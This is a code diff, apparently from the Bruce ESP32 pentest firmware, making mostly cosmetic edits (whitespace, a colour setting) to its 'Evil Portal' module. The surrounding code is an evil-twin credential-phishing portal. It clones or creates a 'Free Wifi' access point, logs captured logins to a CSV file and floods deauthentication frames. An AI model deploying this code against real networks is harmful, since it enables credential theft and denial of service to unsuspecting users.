@@ -40,7 +40,7 @@ void handleCreds() {
       saveToCSV("/Bruce_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
-      ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
+      ep->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."));
 }
 
 void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
@@ -58,8 +58,8 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     while(checkNextPress()){ yield(); } // debounce
 
     //  tssid="" means that are opening a virgin Evil Portal
-    if (tssid=="")  { 
-      AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:"); 
+    if (tssid=="")  {
+      AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
       }
     else { // tssid != "" means that is was cloned and can deploy Deauth
       //memcpy(ap_record.bssid, bssid, 6);
@@ -109,19 +109,19 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     });
 
     ep->begin();
-    
+
     bool hold_deauth = false;
     int tmp=millis(); // one deauth frame each 30ms at least
     redraw=true;
     while(1) {
       if(redraw) {
         drawMainBorder();
-        
+
         tft.setTextSize(FM);
         tft.setTextColor(TFT_RED);
         tft.drawCentreString("Evil Portal",WIDTH/2, 29, SMOOTH_FONT);
         tft.setCursor(8,46);
-        tft.setTextColor(FGCOLOR);
+        tft.setTextColor(bruceConfig.priColor);
         tft.println("AP: " + AP_name);
         tft.setCursor(8,tft.getCursorY());
         tft.println("->" + WiFi.softAPIP().toString() + "/creds");
@@ -138,7 +138,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         if (deauth){
           if (hold_deauth) {
             tft.setTextSize(FP);
-            tft.setTextColor(FGCOLOR);
+            tft.setTextColor(bruceConfig.priColor);
             tft.drawRightString("Deauth OFF", WIDTH-6,HEIGHT-8,SMOOTH_FONT);
           } else {
             tft.setTextSize(FP);
@@ -150,7 +150,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         redraw=false;
       }
 
-      if(!hold_deauth && (millis()-tmp) >5)  { 
+      if(!hold_deauth && (millis()-tmp) >5)  {
         wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
         tmp=millis();
       }
@@ -192,7 +192,7 @@ void saveToCSV(const String &filename, const String &csvLine) {
 }
 
 String getHtmlContents(String body) {
-  PROGMEM String html = 
+  PROGMEM String html =
     "<!DOCTYPE html>"
     "<html>"
     "<head>"
